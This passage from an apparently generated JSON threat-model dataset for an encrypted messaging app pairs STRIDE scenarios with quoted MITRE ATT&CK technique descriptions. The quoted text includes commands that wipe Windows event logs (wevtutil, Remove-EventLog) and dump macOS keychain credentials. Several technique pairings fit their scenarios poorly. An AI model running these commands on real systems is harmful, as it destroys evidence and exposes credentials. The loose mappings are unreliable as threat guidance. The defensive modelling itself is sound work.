                "description": "Adversaries may manipulate software dependencies and development tools prior to receipt by a final consumer for the purpose of data or system compromise. Applications often depend on external software to function properly. Popular open source projects that are used as dependencies in many applications may be targeted as a means to add malicious code to users of the dependency.(Citation: Trendmicro NPM Compromise)  \n\nTargeting may be specific to a desired victim set or may be distributed to a broad set of consumers but only move on to additional tactics on specific victims. ",
                "id": "attack-pattern--191cc6af-1bb2-4344-ab5f-28e496638720",
                "technique_id": "T1195.001"
            }
        },
        {
            "Threat Type": "Tampering",
            "Scenario": "Inserting unauthorized keys into the key management database to enable message interception.",
            "Assumptions": [
                {
                    "Assumption": "Attacker has access to the key management infrastructure.",
                    "Role": "Attacker",
                    "Condition": "Compromised infrastructure or insider threat"
                },
                {
                    "Assumption": "The system does not validate the authenticity of new keys adequately.",
                    "Role": "Application Developer",
                    "Condition": "Weak key management or validation protocols"
                },
                {
                    "Assumption": "Users trust the key management process implicitly.",
                    "Role": "User",
                    "Condition": "Lack of verification tools or methods for key authenticity"
                }
            ],
            "Potential Impact": "Data confidentiality and integrity breach.",
            "MITRE ATT&CK Keywords": [
                "key management",
                "tampering",
                "encryption",
                "database access"
            ],
            "mitre_technique": {
                "name": "Weaken Encryption",
                "description": "Adversaries may compromise a network device\u2019s encryption capability in order to bypass encryption that would otherwise protect data communications. (Citation: Cisco Synful Knock Evolution)\n\nEncryption can be used to protect transmitted network traffic to maintain its confidentiality (protect against unauthorized disclosure) and integrity (protect against unauthorized changes). Encryption ciphers are used to convert a plaintext message to ciphertext and can be computationally intensive to decipher without the associated decryption key. Typically, longer keys increase the cost of cryptanalysis, or decryption without the key.\n\nAdversaries can compromise and manipulate devices that perform encryption of network traffic. For example, through behaviors such as [Modify System Image](https://attack.mitre.org/techniques/T1601), [Reduce Key Space](https://attack.mitre.org/techniques/T1600/001), and [Disable Crypto Hardware](https://attack.mitre.org/techniques/T1600/002), an adversary can negatively effect and/or eliminate a device\u2019s ability to securely encrypt network traffic. This poses a greater risk of unauthorized disclosure and may help facilitate data manipulation, Credential Access, or Collection efforts. (Citation: Cisco Blog Legacy Device Attacks)",
                "id": "attack-pattern--1f9012ef-1e10-4e48-915e-e03563435fe8",
                "technique_id": "T1600"
            }
        },
        {
            "Threat Type": "Repudiation",
            "Scenario": "User denies sending or receiving a particular message, causing disputes over the authenticity of communication records.",
            "Assumptions": [
                {
                    "Assumption": "The application does not adequately log message transactions.",
                    "Role": "Application Developer",
                    "Condition": "Lack of or weak logging mechanisms"
                },
                {
                    "Assumption": "Communication logs are not tamper-proof.",
                    "Role": "Application Developer",
                    "Condition": "Logs can be altered or deleted without trace"
                },
                {
                    "Assumption": "The system lacks mechanisms for verifying the authenticity and integrity of message logs.",
                    "Role": "Application Developer",
                    "Condition": "Absence of cryptographic proofs or signatures"
                }
            ],
            "Potential Impact": "Disruption of trust and potential legal implications.",
            "MITRE ATT&CK Keywords": [
                "logging",
                "transaction records",
                "repudiation",
                "audit"
            ],
            "mitre_technique": {
                "name": "Clear Linux or Mac System Logs",
                "description": "Adversaries may clear system logs to hide evidence of an intrusion. macOS and Linux both keep track of system or user-initiated actions via system logs. The majority of native system logging is stored under the <code>/var/log/</code> directory. Subfolders in this directory categorize logs by their related functions, such as:(Citation: Linux Logs)\n\n* <code>/var/log/messages:</code>: General and system-related messages\n* <code>/var/log/secure</code> or <code>/var/log/auth.log</code>: Authentication logs\n* <code>/var/log/utmp</code> or <code>/var/log/wtmp</code>: Login records\n* <code>/var/log/kern.log</code>: Kernel logs\n* <code>/var/log/cron.log</code>: Crond logs\n* <code>/var/log/maillog</code>: Mail server logs\n* <code>/var/log/httpd/</code>: Web server access and error logs\n",
                "id": "attack-pattern--2bce5b30-7014-4a5d-ade7-12913fe6ac36",
                "technique_id": "T1070.002"
            }
        },
        {
            "Threat Type": "Repudiation",
            "Scenario": "Adversary anonymizes actions to cause indistinguishable logs, making it hard to trace back malicious activity.",
            "Assumptions": [
                {
                    "Assumption": "The application allows high anonymity in user actions.",
                    "Role": "Application Developer",
                    "Condition": "Design choice for privacy"
                },
                {
                    "Assumption": "Logging mechanisms do not tie actions back to specific entities.",
                    "Role": "Application Developer",
                    "Condition": "Logs lack sufficient detail or traceability"
                },
                {
                    "Assumption": "System administrators do not enforce strict monitoring and log review.",
                    "Role": "System Administrator",
                    "Condition": "Lax or manual log review processes"
                }
            ],
            "Potential Impact": "Inability to hold users accountable for certain actions.",
            "MITRE ATT&CK Keywords": [
                "anonymity",
                "repudiation",
                "logging",
                "monitoring"
            ],
            "mitre_technique": {
                "name": "Clear Windows Event Logs",
                "description": "Adversaries may clear Windows Event Logs to hide the activity of an intrusion. Windows Event Logs are a record of a computer's alerts and notifications. There are three system-defined sources of events: System, Application, and Security, with five event types: Error, Warning, Information, Success Audit, and Failure Audit.\n\n\nWith administrator privileges, the event logs can be cleared with the following utility commands:\n\n* <code>wevtutil cl system</code>\n* <code>wevtutil cl application</code>\n* <code>wevtutil cl security</code>\n\nThese logs may also be cleared through other mechanisms, such as the event viewer GUI or [PowerShell](https://attack.mitre.org/techniques/T1059/001). For example, adversaries may use the PowerShell command <code>Remove-EventLog -LogName Security</code> to delete the Security EventLog and after reboot, disable future logging.  Note: events may still be generated and logged in the .evtx file between the time the command is run and the reboot.(Citation: disable_win_evt_logging)\n\nAdversaries may also attempt to clear logs by directly deleting the stored log files within `C:\\Windows\\System32\\winevt\\logs\\`.",
                "id": "attack-pattern--6495ae23-3ab4-43c5-a94f-5638a2c31fd2",
                "technique_id": "T1070.001"
            }
        },
        {
            "Threat Type": "Repudiation",
            "Scenario": "Attacker modifies transaction history or message logs to erase traces of malicious activities.",
            "Assumptions": [
                {
                    "Assumption": "Attacker can gain access to logs.",
                    "Role": "Attacker",
                    "Condition": "Compromised user account or system vulnerability"
                },
                {
                    "Assumption": "Logs are stored in a modifiable format without protections.",
                    "Role": "Application Developer",
                    "Condition": "Lack of protections such as write-only logs or cryptographic validation"
                },
                {
                    "Assumption": "Logging infrastructure does not include redundancy checks or tamper-evident mechanisms.",
                    "Role": "Application Developer",
                    "Condition": "Design or cost decision"
                }
            ],
            "Potential Impact": "Lost data integrity and inability to trace actions.",
            "MITRE ATT&CK Keywords": [
                "logging",
                "repudiation",
                "integrity",
                "tampering"
            ],
            "mitre_technique": {
                "name": "Stored Data Manipulation",
                "description": "Adversaries may insert, delete, or manipulate data at rest in order to influence external outcomes or hide activity, thus threatening the integrity of the data.(Citation: FireEye APT38 Oct 2018)(Citation: DOJ Lazarus Sony 2018) By manipulating stored data, adversaries may attempt to affect a business process, organizational understanding, and decision making.\n\nStored data could include a variety of file formats, such as Office files, databases, stored emails, and custom file formats. The type of modification and the impact it will have depends on the type of data as well as the goals and objectives of the adversary. For complex systems, an adversary would likely need special expertise and possibly access to specialized software related to the system that would typically be gained through a prolonged information gathering campaign in order to have the desired impact.",
                "id": "attack-pattern--1cfcb312-b8d7-47a4-b560-4b16cc677292",
                "technique_id": "T1565.001"
            }
        },
        {
            "Threat Type": "Information Disclosure",
            "Scenario": "Unauthorized access to sensitive messages due to improper handling of encryption keys.",
            "Assumptions": [
                {
                    "Assumption": "Encryption keys are not securely stored.",
                    "Role": "Application Developer",
                    "Condition": "Weak key storage mechanisms"
                },
                {
                    "Assumption": "Attackers can gain access to key storage.",
                    "Role": "Attacker",
                    "Condition": "Compromised device or storage vulnerability"
                },
                {
                    "Assumption": "Keys are not rotated regularly.",
                    "Role": "System Administrator",
                    "Condition": "Lack of key management policies"
                }
            ],
            "Potential Impact": "Data confidentiality breach.",
            "MITRE ATT&CK Keywords": [
                "information disclosure",
                "encryption keys",
                "storage",
                "access control"
            ],
            "mitre_technique": {
                "name": "Keychain",
                "description": "Adversaries may acquire credentials from Keychain. Keychain (or Keychain Services) is the macOS credential management system that stores account names, passwords, private keys, certificates, sensitive application data, payment data, and secure notes. There are three types of Keychains: Login Keychain, System Keychain, and Local Items (iCloud) Keychain. The default Keychain is the Login Keychain, which stores user passwords and information. The System Keychain stores items accessed by the operating system, such as items shared among users on a host. The Local Items (iCloud) Keychain is used for items synced with Apple\u2019s iCloud service. \n\nKeychains can be viewed and edited through the Keychain Access application or using the command-line utility <code>security</code>. Keychain files are located in <code>~/Library/Keychains/</code>, <code>/Library/Keychains/</code>, and <code>/Network/Library/Keychains/</code>.(Citation: Keychain Services Apple)(Citation: Keychain Decryption Passware)(Citation: OSX Keychain Schaumann)\n\nAdversaries may gather user credentials from Keychain storage/memory. For example, the command <code>security dump-keychain \u2013d</code> will dump all Login Keychain credentials from <code>~/Library/Keychains/login.keychain-db</code>. Adversaries may also directly read Login Keychain credentials from the <code>~/Library/Keychains/login.keychain</code> file. Both methods require a password, where the default password for the Login Keychain is the current user\u2019s password to login to the macOS host.(Citation: External to DA, the OS X Way)(Citation: Empire Keychain Decrypt)  ",
                "id": "attack-pattern--1eaebf46-e361-4437-bc23-d5d65a3b92e3",
                "technique_id": "T1555.001"
            }
        },
        {
            "Threat Type": "Information Disclosure",
            "Scenario": "Exposed backup files on companion devices revealing sensitive communication data.",
            "Assumptions": [
                {
                    "Assumption": "Backups are not encrypted or protected.",
                    "Role": "User",
                    "Condition": "Failure to enable security features"
                },
                {
                    "Assumption": "Companion devices create backups automatically to a default location.",
                    "Role": "Application Developer",
                    "Condition": "Default settings for ease of use"
                },
                {
                    "Assumption": "Backup files are accessible without sufficient access controls.",
                    "Role": "System Administrator",
                    "Condition": "Weak file permissions or access controls"
                }
            ],
            "Potential Impact": "Compromised data confidentiality.",
            "MITRE ATT&CK Keywords": [
                "backups",
                "information disclosure",
                "file access",
                "companion devices"
            ],
            "mitre_technique": {
                "name": "Credentials In Files",
                "description": "Adversaries may search local file systems and remote file shares for files containing insecurely stored credentials. These can be files created by users to store their own credentials, shared credential stores for a group of individuals, configuration files containing passwords for a system or service, or source code/binary files containing embedded passwords.\n\nIt is possible to extract passwords from backups or saved virtual machines through [OS Credential Dumping](https://attack.mitre.org/techniques/T1003).(Citation: CG 2014) Passwords may also be obtained from Group Policy Preferences stored on the Windows Domain Controller.(Citation: SRD GPP)\n\nIn cloud and/or containerized environments, authenticated user and service account credentials are often stored in local configuration and credential files.(Citation: Unit 42 Hildegard Malware) They may also be found as parameters to deployment commands in container logs.(Citation: Unit 42 Unsecured Docker Daemons) In some cases, these files can be copied and reused on another machine or the contents can be read and then used to authenticate without needing to copy any files.(Citation: Specter Ops - Cloud Credential Storage)",
                "id": "attack-pattern--837f9164-50af-4ac0-8219-379d8a74cefc",
                "technique_id": "T1552.001"
            }
        },
        {
            "Threat Type": "Information Disclosure",
            "Scenario": "Disclosure of sensitive metadata through communication channels.",
            "Assumptions": [
                {
                    "Assumption": "Metadata is not encrypted.",
                    "Role": "Application Developer",
                    "Condition": "Lack of encryption for efficiency or simplicity"
                },
                {
                    "Assumption": "Communication channels leak metadata.",
                    "Role": "Network Administrator",
                    "Condition": "Use of insecure transmission channels"
                },
                {
                    "Assumption": "Users do not use privacy-preserving configurations.",
                    "Role": "User",
                    "Condition": "Default settings are not privacy-focused"
                }
            ],
            "Potential Impact": "Unintended exposure of user communication patterns and information.",
            "MITRE ATT&CK Keywords": [
                "metadata",
                "information disclosure",
                "encryption",
                "communication"
            ],
            "mitre_technique": {
                "name": "Adversary-in-the-Middle",
                "description": "Adversaries may attempt to position themselves between two or more networked devices using an adversary-in-the-middle (AiTM) technique to support follow-on behaviors such as [Network Sniffing](https://attack.mitre.org/techniques/T1040), [Transmitted Data Manipulation](https://attack.mitre.org/techniques/T1565/002), or replay attacks ([Exploitation for Credential Access](https://attack.mitre.org/techniques/T1212)). By abusing features of common networking protocols that can determine the flow of network traffic (e.g. ARP, DNS, LLMNR, etc.), adversaries may force a device to communicate through an adversary controlled system so they can collect information or perform additional actions.(Citation: Rapid7 MiTM Basics)\n\nFor example, adversaries may manipulate victim DNS settings to enable other malicious activities such as preventing/redirecting users from accessing legitimate sites and/or pushing additional malware.(Citation: ttint_rat)(Citation: dns_changer_trojans)(Citation: ad_blocker_with_miner) Adversaries may also manipulate DNS and leverage their position in order to intercept user credentials, including access tokens ([Steal Application Access Token](https://attack.mitre.org/techniques/T1528)) and session cookies ([Steal Web Session Cookie](https://attack.mitre.org/techniques/T1539)).(Citation: volexity_0day_sophos_FW)(Citation: Token tactics) [Downgrade Attack](https://attack.mitre.org/techniques/T1562/010)s can also be used to establish an AiTM position, such as by negotiating a less secure, deprecated, or weaker version of communication protocol (SSL/TLS) or encryption algorithm.(Citation: mitm_tls_downgrade_att)(Citation: taxonomy_downgrade_att_tls)(Citation: tlseminar_downgrade_att)\n\nAdversaries may also leverage the AiTM position to attempt to monitor and/or modify traffic, such as in [Transmitted Data Manipulation](https://attack.mitre.org/techniques/T1565/002). Adversaries can setup a position similar to AiTM to prevent traffic from flowing to the appropriate destination, potentially to [Impair Defenses](https://attack.mitre.org/techniques/T1562) and/or in support of a [Network Denial of Service](https://attack.mitre.org/techniques/T1498).",
                "id": "attack-pattern--035bb001-ab69-4a0b-9f6c-2de8b09e1b9d",
                "technique_id": "T1557"
            }
        },
        {
            "Threat Type": "Denial of Service",
            "Scenario": "Distributed Denial of Service (DDoS) attack on messaging service, disrupting availability.",
            "Assumptions": [
                {
                    "Assumption": "Attackers have sufficient resources to launch a DDoS attack.",
                    "Role": "Attacker",
                    "Condition": "Access to botnet or similar resources"
                },
                {
                    "Assumption": "The service has vulnerabilities that allow overwhelming traffic.",
                    "Role": "Application Developer",
                    "Condition": "Insufficient DDoS protection mechanisms"
                },
                {
                    "Assumption": "Network infrastructure cannot mitigate the attack effectively.",
                    "Role": "Network Administrator",
                    "Condition": "Lack of robust network defenses"
                }
            ],
            "Potential Impact": "Disruption to service availability.",
            "MITRE ATT&CK Keywords": [
                "DDoS",
                "network",
                "service disruption",
                "availability"
            ],
            "mitre_technique": {
                "name": "Direct Network Flood",
                "description": "Adversaries may attempt to cause a denial of service (DoS) by directly sending a high-volume of network traffic to a target. This DoS attack may also reduce the availability and functionality of the targeted system(s) and network. [Direct Network Flood](https://attack.mitre.org/techniques/T1498/001)s are when one or more systems are used to send a high-volume of network packets towards the targeted service's network. Almost any network protocol may be used for flooding. Stateless protocols such as UDP or ICMP are commonly used but stateful protocols such as TCP can be used as well.\n\nBotnets are commonly used to conduct network flooding attacks against networks and services. Large botnets can generate a significant amount of traffic from systems spread across the global Internet. Adversaries may have the resources to build out and control their own botnet infrastructure or may rent time on an existing botnet to conduct an attack. In some of the worst cases for distributed DoS (DDoS), so many systems are used to generate the flood that each one only needs to send out a small amount of traffic to produce enough volume to saturate the target network. In such circumstances, distinguishing DDoS traffic from legitimate clients becomes exceedingly difficult. Botnets have been used in some of the most high-profile DDoS flooding attacks, such as the 2012 series of incidents that targeted major US banks.(Citation: USNYAG IranianBotnet March 2016)",
                "id": "attack-pattern--0bda01d5-4c1d-4062-8ee2-6872334383c3",
                "technique_id": "T1498.001"
            }
        },
        {
            "Threat Type": "Denial of Service",
            "Scenario": "Resource exhaustion attack by abusing connections on companion devices.",
            "Assumptions": [
                {
                    "Assumption": "Companion devices do not limit the number of open connections.",
                    "Role": "Application Developer",
                    "Condition": "No connection throttling or limiting mechanisms"
                },
                {
                    "Assumption": "Attackers can initiate multiple concurrent connections.",
                    "Role": "Attacker",
                    "Condition": "Ability to script or automate connection attempts"
                },
                {
                    "Assumption": "The primary device does not detect and block abusive behavior.",
                    "Role": "Application Developer",
                    "Condition": "Lack of behavioral analysis or anomaly detection"
                }
            ],
            "Potential Impact": "Service disruption on companion devices.",
            "MITRE ATT&CK Keywords": [
                "resource exhaustion",
                "denial of service",
                "connections",
                "companion devices"
            ],
            "mitre_technique": {
                "name": "Application Exhaustion Flood",
                "description": "Adversaries may target resource intensive features of applications to cause a denial of service (DoS), denying availability to those applications. For example, specific features in web applications may be highly resource intensive. Repeated requests to those features may be able to exhaust system resources and deny access to the application or the server itself.(Citation: Arbor AnnualDoSreport Jan 2018)",
                "id": "attack-pattern--18cffc21-3260-437e-80e4-4ab8bf2ba5e9",
                "technique_id": "T1499.003"
            }
        },
        {
            "Threat Type": "Denial of Service",
            "Scenario": "Exploit of flawed encryption protocol implementation causing infinite loops or crash.",
            "Assumptions": [
                {
                    "Assumption": "The application is using a vulnerable version of the encryption protocol.",
                    "Role": "Application Developer",
                    "Condition": "Failure to update or patch known vulnerabilities"
                },
                {
                    "Assumption": "Attackers can identify and exploit this specific vulnerability.",
                    "Role": "Attacker",
                    "Condition": "Knowledge of the encryption protocol's internals and weaknesses"
                },
                {
                    "Assumption": "The implementation lacks adequate error handling and input validation.",
                    "Role": "Application Developer",
                    "Condition": "Design oversight or complexity in encryption logic"
                }
            ],
            "Potential Impact": "Service disruption and potential data corruption.",
            "MITRE ATT&CK Keywords": [
                "protocol exploitation",
                "encryption",
                "denial of service",
                "crash"
            ],
            "mitre_technique": {
                "name": "Application or System Exploitation",
                "description": "Adversaries may exploit software vulnerabilities that can cause an application or system to crash and deny availability to users. (Citation: Sucuri BIND9 August 2015) Some systems may automatically restart critical applications and services when crashes occur, but they can likely be re-exploited to cause a persistent denial of service (DoS) condition.\n\nAdversaries may exploit known or zero-day vulnerabilities to crash applications and/or systems, which may also lead to dependent applications and/or systems to be in a DoS condition. Crashed or restarted applications or systems may also have other effects such as [Data Destruction](https://attack.mitre.org/techniques/T1485), [Firmware Corruption](https://attack.mitre.org/techniques/T1495), [Service Stop](https://attack.mitre.org/techniques/T1489) etc. which may further cause a DoS condition and deny availability to critical information, applications and/or systems. ",
                "id": "attack-pattern--2bee5ffb-7a7a-4119-b1f2-158151b19ac0",
                "technique_id": "T1499.004"
            }
        },
        {
            "Threat Type": "Elevation of Privilege",
            "Scenario": "Exploitation of a vulnerability in the primary device to execute arbitrary code with elevated permissions.",
            "Assumptions": [
                {
                    "Assumption": "The primary device has a software vulnerability.",
                    "Role": "Application Developer",
                    "Condition": "Unpatched or previously unknown software flaw"
                },
                {
                    "Assumption": "The attacker is able to deliver malicious payload to the device.",
                    "Role": "Attacker",
                    "Condition": "Successful code delivery mechanism, e.g., through an exploit or social engineering"
                },
                {
                    "Assumption": "The system lacks proper privilege separation and sandboxing.",
                    "Role": "Application Developer",
                    "Condition": "Weakness in architecture or design"
                }
            ],
            "Potential Impact": "Compromised system integrity and unauthorized access.",
            "MITRE ATT&CK Keywords": [
                "code execution",
                "privilege escalation",
                "vulnerability",
                "primary device"
            ],
            "mitre_technique": {
                "name": "File System Permissions Weakness",
                "description": "Processes may automatically execute specific binaries as part of their functionality or to perform other actions. If the permissions on the file system directory containing a target binary, or permissions on the binary itself, are improperly set, then the target binary may be overwritten with another binary using user-level permissions and executed by the original process. If the original process and thread are running under a higher permissions level, then the replaced binary will also execute under higher-level permissions, which could include SYSTEM.\n\nAdversaries may use this technique to replace legitimate binaries with malicious ones as a means of executing code at a higher permissions level. If the executing process is set to run at a specific time or during a certain event (e.g., system bootup) then this technique can also be used for persistence.\n\n### Services\n\nManipulation of Windows service binaries is one variation of this technique. Adversaries may replace a legitimate service executable with their own executable to gain persistence and/or privilege escalation to the account context the service is set to execute under (local/domain account, SYSTEM, LocalService, or NetworkService). Once the service is started, either directly by the user (if appropriate access is available) or through some other means, such as a system restart if the service starts on bootup, the replaced executable will run instead of the original service executable.\n\n### Executable Installers\n\nAnother variation of this technique can be performed by taking advantage of a weakness that is common in executable, self-extracting installers. During the installation process, it is common for installers to use a subdirectory within the <code>%TEMP%</code> directory to unpack binaries such as DLLs, EXEs, or other payloads. When installers create subdirectories and files they often do not set appropriate permissions to restrict write access, which allows for execution of untrusted code placed in the subdirectories or overwriting of binaries used in the installation process. This behavior is related to and may take advantage of [DLL Search Order Hijacking](https://attack.mitre.org/techniques/T1038). Some installers may also require elevated privileges that will result in privilege escalation when executing adversary controlled code. This behavior is related to [Bypass User Account Control](https://attack.mitre.org/techniques/T1088). Several examples of this weakness in existing common installers have been reported to software vendors. (Citation: Mozilla Firefox Installer DLL Hijack) (Citation: Seclists Kanthak 7zip Installer)",
                "id": "attack-pattern--0ca7beef-9bbc-4e35-97cf-437384ddce6a",
                "technique_id": "T1044"
            }
        },
        {
            "Threat Type": "Elevation of Privilege",
            "Scenario": "Attacker leverages compromised companion device to gain access to high-privilege operations.",
            "Assumptions": [
                {
                    "Assumption": "Companion device is compromised either through physical or remote access.",
                    "Role": "Attacker",
                    "Condition": "Successful hacking attempt or insider threat"
                },
                {
                    "Assumption": "Companion device has elevated privileges that can be exploited.",
                    "Role": "Application Developer",
                    "Condition": "Inadequate privilege separation between companion devices and primary device"
                },
                {
                    "Assumption": "Primary device relies on trust from companion devices without additional verification.",
                    "Role": "Application Developer",
                    "Condition": "Trust-based communication model without secondary validation mechanisms"
                }
            ],
            "Potential Impact": "Unauthorized access and execution of high-privilege operations.",
            "MITRE ATT&CK Keywords": [
                "companion device",
                "elevation of privilege",
                "unauthorized access",
                "exploitation"
            ],
            "mitre_technique": {
                "name": "Exploitation for Privilege Escalation",
                "description": "Adversaries may exploit software vulnerabilities in an attempt to elevate privileges. Exploitation of a software vulnerability occurs when an adversary takes advantage of a programming error in a program, service, or within the operating system software or kernel itself to execute adversary-controlled code. Security constructs such as permission levels will often hinder access to information and use of certain techniques, so adversaries will likely need to perform privilege escalation to include use of software exploitation to circumvent those restrictions.\n\nWhen initially gaining access to a system, an adversary may be operating within a lower privileged process which will prevent them from accessing certain resources on the system. Vulnerabilities may exist, usually in operating system components and software commonly running at higher permissions, that can be exploited to gain higher levels of access on the system. This could enable someone to move from unprivileged or user level permissions to SYSTEM or root permissions depending on the component that is vulnerable. This could also enable an adversary to move from a virtualized environment, such as within a virtual machine or container, onto the underlying host. This may be a necessary step for an adversary compromising an endpoint system that has been properly configured and limits other privilege escalation methods.\n\nAdversaries may bring a signed vulnerable driver onto a compromised machine so that they can exploit the vulnerability to execute code in kernel mode. This process is sometimes referred to as Bring Your Own Vulnerable Driver (BYOVD).(Citation: ESET InvisiMole June 2020)(Citation: Unit42 AcidBox June 2020) Adversaries may include the vulnerable driver with files delivered during Initial Access or download it to a compromised system via [Ingress Tool Transfer](https://attack.mitre.org/techniques/T1105) or [Lateral Tool Transfer](https://attack.mitre.org/techniques/T1570).",
                "id": "attack-pattern--b21c3b2d-02e6-45b1-980b-e69051040839",
                "technique_id": "T1068"
            }
        },
        {
            "Threat Type": "Elevation of Privilege",
            "Scenario": "Malicious application gains root access on a mobile device, compromising the messaging application\u2019s security.",
            "Assumptions": [
                {
                    "Assumption": "Mobile device is rooted or has a root exploit available.",
                    "Role": "User",
                    "Condition": "Rooting device for extended functionality or having an unpatched vulnerability"
                },
                {
                    "Assumption": "Malicious application can be installed and gain root privileges.",
                    "Role": "Attacker",
                    "Condition": "Application bypasses security checks or exploits vulnerabilities"
                },
                {
                    "Assumption": "Messaging application does not check for device root status.",
                    "Role": "Application Developer",
                    "Condition": "Lack of integrity checks for device status"
                }
            ],
            "Potential Impact": "Complete device and data compromise.",
            "MITRE ATT&CK Keywords": [
                "root access",
                "mobile device",
                "elevation of privilege",
                "compromise"
            ],
            "mitre_technique": {
                "name": "Securityd Memory",
                "description": "An adversary with root access may gather credentials by reading `securityd`\u2019s memory. `securityd` is a service/daemon responsible for implementing security protocols such as encryption and authorization.(Citation: Apple Dev SecurityD) A privileged adversary may be able to scan through `securityd`'s memory to find the correct sequence of keys to decrypt the user\u2019s logon keychain. This may provide the adversary with various plaintext passwords, such as those for users, WiFi, mail, browsers, certificates, secure notes, etc.(Citation: OS X Keychain)(Citation: OSX Keydnap malware)\n\nIn OS X prior to El Capitan, users with root access can read plaintext keychain passwords of logged-in users because Apple\u2019s keychain implementation allows these credentials to be cached so that users are not repeatedly prompted for passwords.(Citation: OS X Keychain)(Citation: External to DA, the OS X Way) Apple\u2019s `securityd` utility takes the user\u2019s logon password, encrypts it with PBKDF2, and stores this master key in memory. Apple also uses a set of keys and algorithms to encrypt the user\u2019s password, but once the master key is found, an adversary need only iterate over the other values to unlock the final password.(Citation: OS X Keychain)",
                "id": "attack-pattern--1a80d097-54df-41d8-9d33-34e755ec5e72",
                "technique_id": "T1555.002"
            }
        }
    ]
},
{
    "case_number": "13",
    "batch_number": "22",
    "threats": [
        {
            "Threat Type": "Spoofing",
            "Scenario": "An attacker creates a fake messaging application resembling one of the popular end-to-end encrypted apps such as Signal and tricks users into downloading it.",
            "Assumptions": [
                {
                    "Assumption": "Users do not verify the authenticity of the application source.",
                    "Role": "User",
                    "Condition": "Users are unaware of how to verify application authenticity."
                },
                {
                    "Assumption": "The fake application is convincingly designed to look legitimate.",
                    "Role": "Attacker",
                    "Condition": "Attacker has resources to design authentic-looking applications."
                },
                {
                    "Assumption": "App stores do not have stringent verification processes.",
                    "Role": "App store",
                    "Condition": "App stores fail to detect and remove fake applications promptly."
                }
            ],
            "Potential Impact": "Unauthorized access to sensitive data; compromise of user credentials.",
            "MITRE ATT&CK Keywords": [
                "spoofing",
                "social engineering",
                "authentication",
                "malware"
            ],
            "mitre_technique": {
                "name": "Indicator Removal from Tools",
                "description": "If a malicious tool is detected and quarantined or otherwise curtailed, an adversary may be able to determine why the malicious tool was detected (the indicator), modify the tool by removing the indicator, and use the updated version that is no longer detected by the target's defensive systems or subsequent targets that may use similar systems.\n\nA good example of this is when malware is detected with a file signature and quarantined by anti-virus software. An adversary who can determine that the malware was quarantined because of its file signature may use [Software Packing](https://attack.mitre.org/techniques/T1045) or otherwise modify the file so it has a different signature, and then re-use the malware.",
                "id": "attack-pattern--00d0b012-8a03-410e-95de-5826bf542de6",
                "technique_id": "T1066"
            }
        },
        {
            "Threat Type": "Spoofing",
            "Scenario": "An attacker intercepts the authentication process between a primary and companion device to impersonate the user.",
            "Assumptions": [
                {
                    "Assumption": "The attacker has access to the communication channel during the authentication process.",
                    "Role": "Attacker",
                    "Condition": "Man-in-the-middle position."
                },
                {
                    "Assumption": "Authentication messages are not adequately protected against interception.",
                    "Role": "System",
                    "Condition": "Encryption or verification mechanisms are weak or flawed."
                },
                {
                    "Assumption": "The attacker possesses the technical capability to modify intercepted messages.",
                    "Role": "Attacker",
                    "Condition": "Attacker has sufficient skills and tools."
                }
            ],
            "Potential Impact": "Unauthorized access to messaging account, potential data breach.",
            "MITRE ATT&CK Keywords": [
                "spoofing",
                "man-in-the-middle",
                "network",
                "credential access"
            ],
            "mitre_technique": {
                "name": "Adversary-in-the-Middle",
                "description": "Adversaries may attempt to position themselves between two or more networked devices using an adversary-in-the-middle (AiTM) technique to support follow-on behaviors such as [Network Sniffing](https://attack.mitre.org/techniques/T1040), [Transmitted Data Manipulation](https://attack.mitre.org/techniques/T1565/002), or replay attacks ([Exploitation for Credential Access](https://attack.mitre.org/techniques/T1212)). By abusing features of common networking protocols that can determine the flow of network traffic (e.g. ARP, DNS, LLMNR, etc.), adversaries may force a device to communicate through an adversary controlled system so they can collect information or perform additional actions.(Citation: Rapid7 MiTM Basics)\n\nFor example, adversaries may manipulate victim DNS settings to enable other malicious activities such as preventing/redirecting users from accessing legitimate sites and/or pushing additional malware.(Citation: ttint_rat)(Citation: dns_changer_trojans)(Citation: ad_blocker_with_miner) Adversaries may also manipulate DNS and leverage their position in order to intercept user credentials, including access tokens ([Steal Application Access Token](https://attack.mitre.org/techniques/T1528)) and session cookies ([Steal Web Session Cookie](https://attack.mitre.org/techniques/T1539)).(Citation: volexity_0day_sophos_FW)(Citation: Token tactics) [Downgrade Attack](https://attack.mitre.org/techniques/T1562/010)s can also be used to establish an AiTM position, such as by negotiating a less secure, deprecated, or weaker version of communication protocol (SSL/TLS) or encryption algorithm.(Citation: mitm_tls_downgrade_att)(Citation: taxonomy_downgrade_att_tls)(Citation: tlseminar_downgrade_att)\n\nAdversaries may also leverage the AiTM position to attempt to monitor and/or modify traffic, such as in [Transmitted Data Manipulation](https://attack.mitre.org/techniques/T1565/002). Adversaries can setup a position similar to AiTM to prevent traffic from flowing to the appropriate destination, potentially to [Impair Defenses](https://attack.mitre.org/techniques/T1562) and/or in support of a [Network Denial of Service](https://attack.mitre.org/techniques/T1498).",
                "id": "attack-pattern--035bb001-ab69-4a0b-9f6c-2de8b09e1b9d",
                "technique_id": "T1557"
            }
        },
        {
            "Threat Type": "Spoofing",
            "Scenario": "An attacker uses a phishing campaign to steal private key pairs from users.",
            "Assumptions": [
                {
                    "Assumption": "Users are susceptible to phishing attacks.",
                    "Role": "User",
                    "Condition": "Lack of security awareness or training."
                },
                {
                    "Assumption": "The attacker crafts convincing phishing emails or messages.",
                    "Role": "Attacker",
                    "Condition": "Advanced social engineering skills."
                },
                {
                    "Assumption": "Private keys are stored in an easily accessible location on user devices.",
                    "Role": "System",
                    "Condition": "Insufficient key management practices."
                }
            ],
            "Potential Impact": "Compromised user identity and potential unauthorized message decryption.",
            "MITRE ATT&CK Keywords": [
                "phishing",
                "social engineering",
                "credential harvesting",
                "key extraction"
            ],
            "mitre_technique": {
                "name": "Spearphishing Attachment",
